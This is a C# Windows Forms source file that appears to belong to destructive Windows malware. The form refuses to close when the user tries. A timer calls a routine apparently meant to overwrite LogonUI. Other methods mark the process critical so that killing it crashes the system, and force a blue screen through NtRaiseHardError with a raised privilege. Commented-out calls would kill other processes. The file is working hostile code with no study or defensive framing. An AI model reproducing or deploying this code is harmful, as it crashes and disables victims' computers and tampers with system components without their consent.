using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace gdifuncs
{
    public partial class majorsgui : Form
    {
        public majorsgui() 
        {
            InitializeComponent(); 
        }

        void MajorsguiLoad(object sender, EventArgs e)
        {
            this.TransparencyKey = Color.Red;
            timer1.Start();
        }
        bool draging = false;
        void PictureBox1Click(object sender, EventArgs e) { }
        Point pointClicked;

        void PictureBox1MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                draging = true;
                pointClicked = new Point(e.X, e.Y);
            }
            else
            {
                draging = false;
            }
        }

        void PictureBox1MouseUp(object sender, MouseEventArgs e)
        {
            draging = false;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            switch (e.CloseReason)
            {
                case CloseReason.UserClosing:
                    e.Cancel = true;
                    break;
            }

            base.OnFormClosing(e);
        }

        void PictureBox1MouseMove(object sender, MouseEventArgs e)
        {
            if (draging)
            {
                Point pointMoveTo;
                pointMoveTo = this.PointToScreen(new Point(e.X, e.Y));
                pointMoveTo.Offset(-pointClicked.X, -pointClicked.Y);
                this.Location = pointMoveTo;
            }
        }

        int alrdyfed = 0;

        void Timer1Tick(object sender, EventArgs e)
        {
            pictureBox6.Size = new Size(pictureBox6.Size.Width, pictureBox6.Size.Height + 1);

            if (pictureBox6.Size.Height > 330 && alrdyfed == 0)
            {
                alrdyfed = 1;

                protection64.logonuiOWR();
            }
        }
        void flogon(object state)
        {
            protection64.logonuiOWR();
        }
        void Timer2Tick(object sender, EventArgs e)
        {
            /*
            timer2.Stop();
            protection64 protection = new protection64();
            System.Threading.ThreadPool.QueueUserWorkItem(protection.winprockill);
            System.Threading.ThreadPool.QueueUserWorkItem(protection.taskkill);*/

            //protection64.logonuiOWR();
        }
        public void SetCriticalProcess()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            NtSetInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
        public void BSOD()
        {
            uint STATUS_ASSERTION_FAILURE = 0xC0000350;
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
        public const int AC_SRC_OVER = 0;
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(
        int Privilege,
        bool bEnablePrivilege,
        bool IsThreadPrivilege,
        out bool PreviousValue
     );

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response
        );

        public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        public const uint GENERIC_READ = 0x80000000;
        public const uint GENERIC_WRITE = 0x40000000;
        public const uint CREATE_NEW = 1;
        public const uint CREATE_ALWAYS = 2;
        public const uint OPEN_EXISTING = 3;
        public const uint FILE_SHARE_READ = 1;
        public const uint FILE_SHARE_WRITE = 2;
    }
}